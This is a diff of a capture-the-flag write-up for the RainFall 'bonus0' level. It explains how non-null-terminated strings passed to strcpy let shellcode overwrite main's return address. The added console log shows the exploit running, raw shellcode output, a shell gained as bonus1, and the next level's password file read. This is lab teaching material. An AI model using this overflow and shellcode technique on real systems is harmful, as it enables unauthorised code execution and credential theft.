@@ -48,10 +48,10 @@ We see that we can put 20 arbitrary bytes into `buf`.
 Meaning we can have a non-null terminated `s1` or `s2`, by setting them to 20 non-null bytes.
 
 By having a non-null terminated `s1`:
-- The call to `strcpy` will copy `s1` to dest, then `s2` to dest (`s1` and `s2` are continous on the stack)
-- Then, dest will be concatenated with `s2`
+- The call to `strcpy` will copy `s1` to `dest`, then `s2` to `dest` (`s1` and `s2` are continous on the stack)
+- Then, `dest` will be concatenated with `s2`
 
-dest will therefore looks like this at the end of `pp`:
+`dest` will therefore looks like this at the end of `pp`:
 ```
 [s1 (20 bytes)][s2 (at most 19 bytes)][s2 (at most 19 bytes)]
 ```
@@ -59,3 +59,15 @@ dest will therefore looks like this at the end of `pp`:
 By putting a 23 bytes shellcode in (`s1` + `s2`), and the address of the `dest` buffer somewhere in `s2`, we can overwrite the return address of `main` to jump to our shellcode.
 
 With the shell given by our shellcode, we then retrieve the flag.
+
+```console
+bonus0@RainFall:~$ bash /tmp/bonus0.sh
+ - 
+ - 
+1�P
+   h//shh/bin��1�1�̀AAAAAAAAAAA&���A �̀AAAAAAAAAAA&���A
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
